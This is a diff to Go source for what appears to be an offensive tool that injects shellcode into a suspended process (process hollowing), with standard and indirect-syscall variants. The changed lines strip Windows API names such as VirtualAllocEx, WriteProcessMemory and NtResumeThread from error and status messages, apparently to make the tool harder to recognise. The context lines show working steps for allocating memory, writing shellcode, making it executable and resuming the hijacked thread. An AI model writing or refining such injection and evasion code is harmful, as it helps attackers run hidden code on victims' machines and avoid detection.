@@ -229,7 +229,7 @@ func hollowStandard(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInf
 	)
 	if remoteAddr == 0 {
 		_ = syscall.TerminateProcess(pi.Process, 1)
-		return sb.String(), fmt.Errorf("VirtualAllocEx failed: %v", allocErr)
+		return sb.String(), fmt.Errorf("memory allocation failed: %v", allocErr)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Allocated memory at 0x%X\n", remoteAddr))
 
@@ -245,7 +245,7 @@ func hollowStandard(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInf
 	)
 	if ret == 0 {
 		_ = syscall.TerminateProcess(pi.Process, 1)
-		return sb.String(), fmt.Errorf("WriteProcessMemory failed: %v", writeErr)
+		return sb.String(), fmt.Errorf("memory write failed: %v", writeErr)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes\n", bytesWritten))
 
@@ -259,7 +259,7 @@ func hollowStandard(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInf
 	)
 	if ret == 0 {
 		_ = syscall.TerminateProcess(pi.Process, 1)
-		return sb.String(), fmt.Errorf("VirtualProtectEx failed: %v", protErr)
+		return sb.String(), fmt.Errorf("memory protection change failed: %v", protErr)
 	}
 	sb.WriteString("[+] Memory protection set to RX\n")
 
@@ -299,7 +299,7 @@ func hollowStandard(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInf
 	ret, _, resumeErr := procResumeThread.Call(uintptr(pi.Thread))
 	if ret == ^uintptr(0) {
 		_ = syscall.TerminateProcess(pi.Process, 1)
-		return sb.String(), fmt.Errorf("ResumeThread failed: %v", resumeErr)
+		return sb.String(), fmt.Errorf("thread resume failed: %v", resumeErr)
 	}
 
 	sb.WriteString("[+] Thread resumed successfully\n")
@@ -367,18 +367,18 @@ func hollowIndirect(sb *strings.Builder, shellcode []byte, pi syscall.ProcessInf
 	status = IndirectNtSetContextThread(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
 	if status != 0 {
 		_ = syscall.TerminateProcess(pi.Process, 1)
-		return sb.String(), fmt.Errorf("NtSetContextThread failed: NTSTATUS 0x%X", status)
+		return sb.String(), fmt.Errorf("thread context set failed: NTSTATUS 0x%X", status)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Set RCX to shellcode at 0x%X\n", remoteAddr))
 
 	// Step 7: Resume thread via NtResumeThread
-	sb.WriteString("[*] Resuming thread via NtResumeThread...\n")
+	sb.WriteString("[*] Resuming thread...\n")
 
 	var prevCount uint32
 	status = IndirectNtResumeThread(uintptr(pi.Thread), &prevCount)
 	if status != 0 {
 		_ = syscall.TerminateProcess(pi.Process, 1)
-		return sb.String(), fmt.Errorf("NtResumeThread failed: NTSTATUS 0x%X", status)
+		return sb.String(), fmt.Errorf("thread resume failed: NTSTATUS 0x%X", status)
 	}
 
 	sb.WriteString(fmt.Sprintf("[+] Thread resumed (previous suspend count: %d)\n", prevCount))
